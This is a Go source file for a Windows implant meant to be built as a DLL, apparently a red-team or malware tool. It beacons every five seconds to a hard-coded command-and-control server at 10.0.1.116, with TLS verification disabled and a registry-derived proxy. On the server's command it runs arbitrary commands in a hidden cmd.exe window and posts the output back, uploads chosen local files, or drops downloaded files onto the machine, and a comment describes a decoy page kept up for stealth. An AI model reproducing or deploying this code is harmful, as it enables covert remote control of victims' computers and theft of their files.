package main

import (
	"C"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func main() {
	Test() //for cross-compilation to DLL, exporting Test func below
}

//find proxy settings via registry - will update this at some stage to use the ieproxy package
func GetProxy() (proxy string) {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.QUERY_VALUE)
	if err != nil {
		fmt.Println(err)
	}
	defer k.Close()

	s, _, err := k.GetIntegerValue("ProxyEnable")
	if err != nil {
		fmt.Println(err)
	}
	if s == 0 {
		proxy = ""
		return
	} else if s == 1 {
		proxy, _, _ = k.GetStringValue("ProxyServer")
		return

	} else {
		proxy = ""
		return
	}

}

//set transport depending on whether a proxy was detected. Needs to be cleaned up to just set the entire client.
func SetTransport() (transpo *http.Transport) {

	Proxy_Server := GetProxy()
	PS := "http://" + Proxy_Server
	proxyURL, _ := url.Parse(PS)

	//var transpo *http.Transport
	//if there is no proxy, create transport without it
	if Proxy_Server == "" {
		fmt.Println("No proxy detected")
		transpo = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	} else {
		fmt.Println("Proxy detected: ", Proxy_Server)
		fmt.Println("Setting proxy to: ", proxyURL)
		transpo = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           http.ProxyURL(proxyURL),
		}
	}
	return
}

//export Test
func Test() string {

	//get proxy via registry

	transport := SetTransport()
	client := &http.Client{Transport: transport}

	for {
		resp, err := client.Get("https://10.0.1.116/test") //change to your server IP
		if err != nil {
			fmt.Println(err)
		}
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		cmd := strings.TrimSpace(string(body))

		if strings.Contains(cmd, "Terminate") {
			Terminate()
		} else if strings.Contains(cmd, "grab") {

			s := strings.Split(cmd, "\"")
			file := s[1]
			//fmt.Println("Asked to upload file: ",file) //for debugging only, comment out if need be
			Upload(string(file))
		} else if strings.Contains(cmd, "push") {

			s := strings.Split(cmd, "\"")
			file := s[1]
			//fmt.Println("Asked to download file: ",file) //for debugging only, comment out if need be
			Download(string(file))
		} else if strings.Contains(cmd, "Under Construction") { //the server resets the page to this text after every request in a silly attempt to be stealthy
			//fmt.Println("Doing nothing") //doing nothing
		} else {
			Exec(cmd)
		}

		time.Sleep(5 * time.Second)
	}

	return "Test OK"
}

func Terminate() {
	os.Exit(0)
}

func Upload(file string) {

	fileName := file
	file_content, err := os.Open(fileName)

	if err != nil {
		fmt.Println(err)
	}
	defer file_content.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", file_content.Name())
	io.Copy(part, file_content)
	writer.Close()

	r, _ := http.NewRequest("POST", "https://10.0.1.116/news", body)
	r.Header.Add("Content-Type", writer.FormDataContentType())
	transport := SetTransport()
	client := &http.Client{Transport: transport}
	client.Do(r)
}

func Download(file string) {
	f, err := os.Create(file)
	if err != nil {
		fmt.Println(err)
	}

	transport := SetTransport()
	client := &http.Client{Transport: transport}
	add := "https://10.0.1.116/download/"

	resp, err := client.Get(add + file)
	_, err = io.Copy(f, resp.Body)
}

func Exec(cmd string) {
	fmt.Println("Executing command: ", cmd)

	cmd_path := "C:\\Windows\\system32\\cmd.exe"
	cmd_instance := exec.Command(cmd_path, "/c", cmd)
	cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd_output, _ := cmd_instance.Output()

	transport := SetTransport()
	client := &http.Client{Transport: transport}

	_, _ = client.Post("https://10.0.1.116/", "text/plain", bytes.NewBufferString(string(cmd_output)))

}
